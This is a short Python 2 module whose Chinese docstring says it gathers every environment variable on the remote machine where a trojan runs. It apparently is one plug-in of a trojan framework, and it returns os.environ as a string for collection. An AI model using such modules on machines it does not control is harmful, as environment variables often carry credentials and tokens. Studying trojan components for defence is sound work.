 # -*- coding: utf-8 -*-
 import os

 def run(**args):
 	"""
 	该模块获取了木马所在远程机器上的所有环境变量
 	"""
 	print "[*] In environment module."
 	return str(os.environ)